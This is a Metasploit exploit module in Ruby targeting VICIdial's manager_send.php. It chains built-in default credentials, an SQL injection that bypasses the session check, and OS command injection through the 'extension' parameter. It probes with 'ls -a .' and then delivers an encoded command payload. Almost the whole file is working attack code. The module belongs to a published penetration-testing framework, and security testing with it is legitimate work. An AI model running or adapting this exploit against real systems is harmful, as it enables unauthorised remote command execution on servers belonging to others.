# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;VICIdial Manager Send OS Command Injection&#039;,
      &#039;Description&#039; => %q{
          The file agc/manager_send.php in the VICIdial web application uses
        unsanitized user input as part of a command that is executed using the PHP
        passthru() function. A valid username, password and session are needed to access
        the injection point. Fortunately, VICIdial has two built-in accounts with default
        passwords and the manager_send.php file has a SQL injection vulnerability that can
        be used to bypass the session check as long as at least one session has been
        created at some point in time. In case there isn&#039;t any valid session, the user can
        provide astGUIcient credentials in order to create one. The results of the injected
        command are returned as part of the response from the web server. Affected versions
        include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The
        default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit.
      },
      &#039;Author&#039;      =>
        [
          &#039;Adam Caudill <adam@adamcaudill.com>&#039;, # Vulnerability discovery
          &#039;AverageSecurityGuy <stephen@averagesecurityguy.info>&#039;, # Metasploit Module
          &#039;sinn3r&#039;, # Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2013-4467&#039; ],
          [ &#039;CVE&#039;, &#039;2013-4468&#039; ],
          [ &#039;OSVDB&#039;, &#039;98903&#039; ],
          [ &#039;OSVDB&#039;, &#039;98902&#039; ],
          [ &#039;BID&#039;, &#039;63340&#039; ],
          [ &#039;BID&#039;, &#039;63288&#039; ],
          [ &#039;URL&#039;, &#039;http://www.openwall.com/lists/oss-security/2013/10/23/10&#039; ],
          [ &#039;URL&#039;, &#039;http://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 23 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 8000, # Apache&#039;s limit for GET, it should be enough one to fit any payload
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              # Based on vicibox availability of binaries
              &#039;RequiredCmd&#039; => &#039;generic perl python awk bash telnet nc openssl&#039;,
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;CMD&#039;,
            {
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Platform&#039; => &#039;unix&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0
      ))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,              [true, &#039;VICIdial Username&#039;, &#039;VDCL&#039;]),
        OptString.new(&#039;PASSWORD&#039;,              [true, &#039;VICIdial Password&#039;, &#039;donotedit&#039;]),
        OptString.new(&#039;USER_ASTGUI&#039;,           [false, &#039;astGUIcient User Login&#039;, &#039;6666&#039;]),
        OptString.new(&#039;PASS_ASTGUI&#039;,           [false, &#039;astGUIcient User Password&#039;, &#039;1234&#039;]),
        OptString.new(&#039;PHONE_USER_ASTGUI&#039;,     [false, &#039;astGUIcient Phone Login&#039;, &#039;6666&#039;]),
        OptString.new(&#039;PHONE_PASSWORD_ASTGUI&#039;, [false, &#039;astGUIcient Phone Password&#039;, &#039;1234&#039;])
      ], self.class)
  end

  # Login through astGUIclient and create a web_client_sessions if there isn&#039;t
  # something available
  def login
    begin
      res = send_request_cgi({
        &#039;uri&#039;       => &#039;/agc/astguiclient.php&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; => {
         "user"        => datastore["USER_ASTGUI"],
         "pass"        => datastore["PASS_ASTGUI"],
         "phone_login" => datastore["PHONE_USER_ASTGUI"],
         "phone_pass"  => datastore["PHONE_PASSWORD_ASTGUI"]
        }
      })
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end

    return res
  end

  def astguiclient_creds?
    if datastore["USER_ASTGUI"].nil? or datastore["USER_ASTGUI"].empty?
      return false
    end

    if datastore["PASS_ASTGUI"].nil? or datastore["PASS_ASTGUI"].empty?
      return false
    end

    if datastore["PHONE_USER_ASTGUI"].nil? or datastore["PHONE_USER_ASTGUI"].empty?
      return false
    end

    if datastore["PHONE_PASSWORD_ASTGUI"].nil? or datastore["PHONE_PASSWORD_ASTGUI"].empty?
      return false
    end

    return true
  end

  def request(cmd, timeout = 20)
    begin
      res = send_request_cgi({
        &#039;uri&#039;      => &#039;/agc/manager_send.php&#039;,
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;vars_get&#039; => {
          "enable_sipsak_messages" => "1",
          "allow_sipsak_messages"  => "1",
          "protocol"               => "sip",
          "ACTION"                 => "OriginateVDRelogin",
          "session_name"           => rand_text_alpha(12), # Random session name
          "server_ip"              => "&#039; OR &#039;1&#039; = &#039;1", # SQL Injection to validate the session
          "extension"              => ";#{cmd};",
          "user"                   => datastore[&#039;USERNAME&#039;],
          "pass"                   => datastore[&#039;PASSWORD&#039;]
        }
      }, timeout)
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end

    return res
  end

  def check
    res = request(&#039;ls -a .&#039;)

    if res and res.code == 200
      if res.body =~ /Invalid Username\/Password/
        vprint_error("#{peer} - Invalid Username or Password.")
        return Exploit::CheckCode::Detected
      elsif res.body =~ /Invalid session_name/
        vprint_error("#{peer} - Web client session not found")
        return Exploit::CheckCode::Detected
      elsif res.body =~ /\.\n\.\.\n/m
        return Exploit::CheckCode::Vulnerable
      end
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("#{peer} - Checking if injection is possible...")
    res = request(&#039;ls -a .&#039;)

    unless res and res.code == 200
      fail_with(Failure::Unknown - "#{peer} - Unknown response, check the target")
    end

    if res.body =~ /Invalid Username\/Password/
      fail_with(Failure::NoAccess - "#{peer} - Invalid VICIdial credentials, check USERNAME and PASSWORD")
    end

    if res.body =~ /Invalid session_name/
      fail_with(Failure::NoAccess, "#{peer} - Valid web client session not found, provide astGUI or wait until someone logins") unless astguiclient_creds?
      print_error("#{peer} - Valid web client session not found, trying to create one...")
      res = login
      unless res and res.code == 200 and res.body =~ /you are logged/
        fail_with(Failure::NoAccess, "#{peer} - Invalid astGUIcient credentials, check astGUI credentials or wait until someone login.")
      end
      res = request(&#039;ls -a .&#039;)
    end

    unless res and res.code == 200 and res.body =~ /\.\n\.\.\n/m
      fail_with(Failure::NotVulnerable, "#{peer} - Injection hasn&#039;t been possible")
    end

    print_good("#{peer} - Exploitation looks feasible, proceeding... ")
    request("#{payload.encoded}", 1)
  end

end

